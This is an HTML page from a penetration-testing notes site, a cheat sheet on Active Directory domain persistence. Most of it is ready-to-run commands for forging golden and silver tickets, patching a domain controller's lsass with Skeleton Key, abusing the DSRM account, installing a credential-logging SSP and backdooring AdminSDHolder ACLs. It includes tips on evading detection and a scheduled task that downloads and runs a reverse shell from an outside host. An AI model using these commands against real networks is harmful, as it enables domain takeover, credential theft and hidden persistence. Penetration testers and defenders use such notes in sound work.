<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Domain Persistence | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Domain Persistence" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
<meta property="og:description" content="There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item current"><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Active Directory</h2>
				<h3>Domain Persistence</h3>
			</div>
			<article class="content">
				<p>There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears.</p>

<p>These are some techniques to make a persistence on a domain.</p>

<h1 id="golden-ticket">Golden Ticket</h1>

<p>A golden ticket is signed and encrypted by the hash of <code class="highlighter-rouge">krbtgt</code> account which makes it a valid TGT ticket. Since user account <strong>validation is not done</strong> by the KDC until <strong>TGT</strong> is <strong>older than 20 minutes</strong>. So we can use even deleted/revoked accounts.</p>

<p>To conclude, the <code class="highlighter-rouge">krbtgt</code> user hash could be used to impersonate any user with any privileges from even a non-domain machine.</p>

<p>First we need to obtain the <code class="highlighter-rouge">krbtgt</code> hash:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc.corp.local
Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'</span>
</code></pre></div></div>
<blockquote>
  <p><strong>RedTeam Note</strong>: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA. DCSync is a technique which allows an attacker to hijack the Domain Controller account and replicate data such as passwords of all domain controllers.</p>
</blockquote>

<p>After that we need to create the ticket.</p>

<ul>
  <li><strong>Invoke-Mimikatz</strong></li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span>

Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'</span>
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: <code class="highlighter-rouge">/ptt</code> injects the ticket in current PowerShell process.</p>

  <p><code class="highlighter-rouge">/ticket</code> saves the ticket to a file for later use.</p>
</blockquote>

<blockquote>
  <p><strong>RedTeam Note</strong>: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it.</p>

  <p><code class="highlighter-rouge">/endin:600</code> Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).</p>

  <p><code class="highlighter-rouge">/renewmax:10080</code> Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)</p>
</blockquote>

<ul>
  <li><strong>Rubeus.exe</strong></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
</code></pre></div></div>

<ul>
  <li><strong>Ticketer.py (impacket)</strong></li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ticketer.py -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-268341927-4156873456-1784235843 -domain corp.local Administrator
export KRB5CCNAME=./administrator.ccache
python psexec.py corp.local/Administrador@dc01.corp.local -k -no-pass
</code></pre></div></div>

<p>Use <code class="highlighter-rouge">klist</code> to list all kerberos tickets:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>klist
</code></pre></div></div>

<p>With a Golden Ticket we can access to any resource of the domain such as shared files (<strong>C$</strong>), and execute services and WMI, so we can user <strong>psexec</strong> or <strong>wmiexec</strong> to obtain a shell.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.corp.local\c$
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: A shell via WMI can not be obtained, so do not use PowerShell Remote.</p>
</blockquote>

<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets</a></p>

<p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket">https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket</a></p>

<h1 id="silver-ticket">Silver Ticket</h1>

<p>A Silver Ticket is a valid <strong>TGS</strong> which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves.</p>

<p>This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc01
</code></pre></div></div>
<p>After that we need to create the ticket.</p>

<ul>
  <li><strong>Invoke-Mimikatz</strong></li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc01.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'</span>
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: Similar command can be used for any other service on a machine: <code class="highlighter-rouge">CIFS</code>, <code class="highlighter-rouge">HOST</code>, <code class="highlighter-rouge">RPCSS</code>, <code class="highlighter-rouge">WSMAN</code>…</p>
</blockquote>

<p>Use <code class="highlighter-rouge">klist</code> to list all kerberos tickets:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>klist
</code></pre></div></div>
<p>And finally we can list the content of File System.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.corp.local\c$
</code></pre></div></div>

<p>This table shows the available services:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Service Type</th>
      <th style="text-align: center">Service Silver Ticket</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">WMI</td>
      <td style="text-align: center">HOST RPCSS</td>
    </tr>
    <tr>
      <td style="text-align: center">PowerShell Remoting</td>
      <td style="text-align: center">HOST HTTP  And Maybe: WSMAN RPCSS</td>
    </tr>
    <tr>
      <td style="text-align: center">WinRM</td>
      <td style="text-align: center">HOST HTTP  And Maybe: WINRM</td>
    </tr>
    <tr>
      <td style="text-align: center">Scheduled Tasks</td>
      <td style="text-align: center">HOST</td>
    </tr>
    <tr>
      <td style="text-align: center">Windows File Sharing, PsExec</td>
      <td style="text-align: center">CIFS</td>
    </tr>
    <tr>
      <td style="text-align: center">LDAP operations, DCSync</td>
      <td style="text-align: center">LDAP</td>
    </tr>
    <tr>
      <td style="text-align: center">Windows Remote Server Administration Tools</td>
      <td style="text-align: center">RPCSS LDAP CIFS</td>
    </tr>
    <tr>
      <td style="text-align: center">Golden Tickets</td>
      <td style="text-align: center">krbtgt</td>
    </tr>
  </tbody>
</table>

<p>There are many ways of achieve command executing using Silver Ticket.</p>

<h2 id="schedule-and-execute-a-task">Schedule and Execute a task</h2>

<p>We just need to create a ticket for the <code class="highlighter-rouge">HOST</code> SPN which will allow us to schedule a task on the target. And then schedule and execute a task.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /S dc01.corp.local /SC Weekly /RU <span class="s2">"NT Authority\SYSTEM"</span> /TN <span class="s2">"STCheck"</span> /TR <span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"</span>

schtasks /Run /S dc01.corp.local /TN <span class="s2">"STCheck"</span>
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: In that case a Nishang Reverve TCP shell was spawned.</p>
</blockquote>

<h2 id="execute-wmi-queries">Execute WMI queries</h2>

<p>To execute WMI queries we just need to create a ticket for the <code class="highlighter-rouge">HOST</code> and <code class="highlighter-rouge">RPCSS</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WmiObject</span> -Class win32_operatingsystem -ComputerName <span class="nv">$Computer</span>

<span class="nb">Invoke-WmiMethod </span>win32_process -ComputerName <span class="nv">$Computer</span> -Name create -ArgumentList <span class="s2">"</span><span class="nv">$RunCommand</span><span class="s2">"</span>

wmic dc01.corp.local list full /format:list
</code></pre></div></div>

<h2 id="psexec">PsExec</h2>

<p>To run commands on other machine with <code class="highlighter-rouge">PsExec</code> we just need to create a ticket for <code class="highlighter-rouge">CIFS</code> service.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\PsExec.exe -accepteula \\dc01.corp.local cmd
</code></pre></div></div>

<h2 id="powershell-remote">PowerShell Remote</h2>

<p>With winrm access over a computer you can access it with PowerShell Remote. A ticket with <code class="highlighter-rouge">HOST</code> and <code class="highlighter-rouge">WSMAN</code> is needed.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName dc01.corp.local
Enter-PSSession -Session <span class="nv">$sess</span>
</code></pre></div></div>

<h2 id="dump-dc-database-with-dcsync">Dump DC database with DCSync</h2>

<p>We can dump DC database using DCSync by crafting a silver ticket with the <code class="highlighter-rouge">LDAP</code> SPN.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:krbtgt"'</span>
</code></pre></div></div>

<h1 id="skeleton-key">Skeleton Key</h1>

<p>Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware.</p>

<p>All the publicly known methods are NOT persistent across reboots.</p>

<blockquote>
  <p><strong>RedTeam Notes</strong>: Its not probably that a enterprise reboot the DC or kill <code class="highlighter-rouge">lsass</code> process.</p>
</blockquote>

<p>To execute this technique domain admin privilegs are required.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"privilege::debug" "misc::skeleton"'</span> -ComputerName dc01.corp.local
</code></pre></div></div>

<p>So it is possible to access any machine with a valid username and <code class="highlighter-rouge">mimikatz</code> as password.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName dc01.corp.local -Credential corp\Administrator
</code></pre></div></div>
<blockquote>
  <p><strong>Note</strong>: In the skeleton key attack both passwords work at the same time, the actual password and <code class="highlighter-rouge">mimikatz</code> as password.</p>
</blockquote>

<p>In case <code class="highlighter-rouge">lsass</code> is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver <code class="highlighter-rouge">mimidriv.sys</code> on disk of the target dc. Be careful this would be very noisy in logs.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz# privilege::debug
mimikatz# !+
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# misc::skeleton
mimikatz# !-
</code></pre></div></div>

<p>The DC can not be patched twice.</p>

<h1 id="directory-services-restore-mode-dsrm">Directory Services Restore Mode (DSRM)</h1>

<p>There is a local administrator on every domain controlled called “Administrator” whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.</p>

<p>We only need to dump the DSRM password:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"token::elevate" "lsadump::sam"'</span> -ComputerName dc01
</code></pre></div></div>

<p>We can compare the Administrator hash with the Administrator hash with the following command:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc01
</code></pre></div></div>
<p>Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logon Behaviour for the DSRM account needs to be changed before we can use its hash.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName dc01
<span class="nb">New-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> -Name <span class="s2">"DsrmAdminLogonBehaviour"</span> -Value 2 -PropertyType DWORD
</code></pre></div></div>

<blockquote>
  <p><strong>Note</strong>: If we get an error such as <em>“New-ItemProperty: The property already exists”</em> you need to modify it.</p>

  <p><code class="highlighter-rouge">Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"</code>
<code class="highlighter-rouge">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2</code></p>
</blockquote>

<ul>
  <li>Over PassTheHash</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:a9b30e5b0dc865eadcea9411e4ade72d /run:powershell.exe'</span>
<span class="nb">ls</span> \\dc01\c<span class="err">$</span>
</code></pre></div></div>
<h1 id="custom-security-support-provider-ssp">Custom Security Support Provider (SSP)</h1>

<p>A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP…</p>

<p>Mimikatz provides a custom SSP named <code class="highlighter-rouge">mimilib.dll</code>. This SSP logs everly local logon, service account and machine account in plain text on the target server.</p>

<p>We can abuse in two different ways:</p>

<ul>
  <li>Dropping the <code class="highlighter-rouge">mimilib.dll</code> to <code class="highlighter-rouge">system32</code> and add mimilib to <code class="highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$packages</span> <span class="o">=</span> <span class="nb">Get-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="s1">'Security Packages'</span> | <span class="nb">select</span> -ExpandProperty <span class="s1">'Security Packages'</span>
<span class="nv">$packages</span> +<span class="o">=</span> <span class="s2">"mimilib"</span>
<span class="nb">Set-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="s1">'Security Packages'</span> -Value <span class="nv">$packages</span>
<span class="nb">Set-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name <span class="s1">'Security Packages'</span> -Value <span class="nv">$packages</span>
</code></pre></div></div>

<ul>
  <li>Inject into lsass using mimikatz (not stable with Server 2016):</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"misc::memssp"'</span>
</code></pre></div></div>

<p>All local logons on the domain controller are logged to <code class="highlighter-rouge">C:\Windows\system32\kiwissp.log</code>.</p>

<h1 id="using-acls">Using ACLs</h1>

<p>Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the <code class="highlighter-rouge">protected groups</code>.</p>

<p>Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.</p>

<p>Lis of protected groups and how can be abused some of them can log on locally to the domain controller:</p>

<ul>
  <li><strong>Account Operators</strong>: Can modify nesteg groups.</li>
  <li><strong>Bakup Operators</strong>: Backup GPO, edit ato add SID of controller account to a privileged gorup and restore.</li>
  <li><strong>Server Operators</strong>: Run a command as system</li>
  <li><strong>Print Operators</strong>: Copy ntds.dit backup, load device drivers.</li>
  <li><strong>Domain Admins</strong>: Can log on.</li>
  <li><strong>Replicator</strong>: Can log on.</li>
  <li><strong>Enterprise Admins</strong>: Can log on.</li>
  <li><strong>Domain Controllers</strong>: Can log on.</li>
  <li><strong>Read-only Domain Controllers</strong>: Can log on.</li>
  <li><strong>Schema Admins</strong>: Can log on.</li>
  <li><strong>Administrators</strong>: Can log on.</li>
</ul>

<p>With Domain Admin privileges which means that we have full control and write permissions on the <code class="highlighter-rouge">AdminSDHolder</code> object, this full control can be abused to create a backdoor or persistence mechanism by adding a user with <strong>Full Permissions</strong> to the AdminSDHolder object.</p>

<p>In 60 minutes when the SDPROP is runned, the user will be added with Full Control access to the ACL of gropus like Domain Admins without actually being a member of it.</p>

<p>Fist we need to add full controll permissions fo a user to the AdminSDHolder:</p>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetADSprefix <span class="s1">'CN=AdminSDHolder,CN=System'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'CN=AdminSDHolder,CN=System,DC=corp,DC=local'</span> -Principal user1 -Verbose 
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p><strong>Note</strong>: Other interesing permissions for a user to the AdminSDHolder:</p>

  <p><code class="highlighter-rouge">ResetPassword</code>, <code class="highlighter-rouge">WriteMembers</code>.</p>
</blockquote>

<p>After 60 minutes the ACL will be propagated automatically to the domain.</p>

<p>It can be also posible to propagate it manually with <code class="highlighter-rouge">Invoke-SDPropatagor.ps1</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName dc01.corp.local
Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session <span class="nv">$sess</span>
Enter-PSSession -Session <span class="nv">$sess</span>

And on the DC:
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
</code></pre></div></div>

<p>To check the Domain Admin Permissions as normal user:</p>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ObjectACL -SamAccountName <span class="s2">"Domain Admins"</span> -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">Get-Acl</span> -Path <span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local'</span><span class="o">)</span>.Access | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p><strong>Note</strong>: <code class="highlighter-rouge">GenericAll</code> means that has FullControl to an object.</p>
</blockquote>

<p>Finally we just need to abuse it.</p>

<h2 id="abusing-fullcontrol-acl">Abusing FullControl ACL</h2>

<ul>
  <li>PowerView:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainGroupMember -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
</code></pre></div>    </div>
  </li>
  <li>ADModule:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-ADGroupMember</span> -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
</code></pre></div>    </div>
  </li>
</ul>

